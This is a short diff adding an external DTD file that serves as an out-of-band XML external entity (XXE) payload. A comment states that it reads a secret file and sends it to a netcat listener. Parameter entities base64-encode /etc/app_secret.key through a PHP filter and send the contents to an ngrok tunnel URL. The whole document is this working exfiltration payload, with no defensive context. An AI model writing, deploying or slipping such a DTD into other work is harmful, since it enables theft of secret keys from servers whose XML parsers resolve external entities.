@@ -1,0 +1,5 @@
+<!-- This DTD will read the secret file and send it to your netcat listener -->
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/app_secret.key">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://18c9d788db36.ngrok-free.app:9999/?data=%file;'>">
+%eval;
+%exfiltrate;
